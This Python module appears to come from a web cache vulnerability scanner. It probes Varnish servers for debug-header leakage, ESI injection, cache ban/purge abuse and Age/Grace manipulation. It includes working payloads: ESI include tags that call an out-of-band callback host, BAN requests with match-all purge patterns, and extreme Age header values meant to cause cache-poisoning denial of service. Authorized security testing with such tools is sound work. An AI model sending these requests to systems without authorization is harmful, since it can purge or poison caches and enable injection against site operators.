#!/usr/bin/env python3

from utils.style import Colors
from utils.utils import configure_logger, random, requests

logger = configure_logger(__name__)

VULN_NAME = "Varnish"


def varnish_debug_headers(url: str, s: requests.Session) -> None:
    """Test Varnish debug/trace headers via Pragma"""
    pragma_payloads = [
        "x-varnish-debug",
        "x-varnish-trace",
        "x-varnish",
    ]
    varnish_keywords = ["varnish", "x-hits", "x-grace"]
    seen = {}
    for p in pragma_payloads:
        try:
            req = s.get(url, headers={"Pragma": p}, verify=False, timeout=10)
            for h in req.headers:
                h_lower = h.lower()
                if any(k in h_lower for k in varnish_keywords) and h_lower not in seen:
                    seen[h_lower] = (h, req.headers[h])
        except Exception as e:
            logger.exception(e)
    for h, val in seen.values():
        print(f"{Colors.CYAN}   └── Varnish debug header: {h}: {val}{Colors.RESET}")


def varnish_esi_injection(url: str, s: requests.Session) -> None:
    """
    Test ESI (Edge Side Includes) injection.
    https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/
    ESI is supported natively by Varnish.
    """
    esi_probe = "bycodevarnish"
    esi_payloads = [
        f'<esi:include src="https://{esi_probe}.oastify.com"/>',
        f'<esi:include src="http://{esi_probe}.oastify.com"/>',
        f'<esi:include src="/{esi_probe}"/>',
        f'<!--esi <esi:include src="/{esi_probe}"/> -->',
    ]
    try:
        capability_req = s.get(
            url,
            headers={"Surrogate-Capability": f"abc=ESI/1.0"},
            verify=False,
            timeout=10,
        )
        # Varnish will add Surrogate-Control if it supports ESI
        if "surrogate-control" in {h.lower() for h in capability_req.headers}:
            print(f"{Colors.YELLOW}   └── Surrogate-Control detected – ESI likely supported{Colors.RESET}")
            for payload in esi_payloads:
                try:
                    uri = f"{url}?cb={random.randrange(9999)}"
                    req = s.post(uri, data=payload, verify=False, timeout=10)
                    if esi_probe in req.text:
                        print(
                            f"{Colors.GREEN}   └── [ESI INJECTION] reflection in response body{Colors.RESET}\n"
                            f"       payload: {payload}"
                        )
                except Exception:
                    pass
    except Exception as e:
        logger.exception(e)


def varnish_ban_poisoning(url: str, s: requests.Session) -> None:
    """
    Test Varnish ban poisoning via X-Ban-Url or X-Purge-Regex headers.
    Some Varnish configs trust these from internal IPs but may be unguarded.
    """
    uri = f"{url}?cb={random.randrange(9999)}"
    ban_headers = [
        {"X-Ban-Url": ".*"},
        {"X-Purge-Regex": ".*"},
        {"X-Cache-Purge": "1"},
    ]
    try:
        baseline = s.get(uri, verify=False, timeout=10)
        for h in ban_headers:
            req = s.request("BAN", uri, headers=h, verify=False, timeout=10)
            if req.status_code in [200, 204]:
                print(
                    f"{Colors.YELLOW}   └── [BAN ACCEPTED] {h} -> {req.status_code}{Colors.RESET}"
                )
            elif req.status_code != baseline.status_code:
                print(f"   └── {h} -> {req.status_code}")
    except Exception as e:
        logger.exception(e)


def varnish_grace_poisoning(url: str, s: requests.Session) -> None:
    """
    Test Varnish Age / Grace manipulation.
    Sending a very high Age header can trick Varnish into serving
    a stale object longer than intended (grace mode CPDoS variant).
    """
    uri = f"{url}?cb={random.randrange(9999)}"
    payloads = [
        {"Age": "99999999"},
        {"Age": "-1"},
        {"X-Grace": "999999"},
    ]
    try:
        baseline = s.get(uri, verify=False, timeout=10, allow_redirects=False)
        for h in payloads:
            req = s.get(uri, headers=h, verify=False, timeout=10, allow_redirects=False)
            if req.status_code != baseline.status_code:
                print(
                    f"{Colors.YELLOW}   └── [Grace/Age behavior] {h} -> {baseline.status_code} > {req.status_code}{Colors.RESET}"
                )
    except Exception as e:
        logger.exception(e)


def varnish(url: str, s: requests.Session) -> None:
    """
    Varnish Cache analysis.
    Signatures: Via: 1.1 varnish, X-Varnish, X-Cache: HIT/MISS (Varnish format)
    https://varnish-cache.org/docs/
    """
    varnish_debug_headers(url, s)
    varnish_ban_poisoning(url, s)
    varnish_esi_injection(url, s)
    varnish_grace_poisoning(url, s)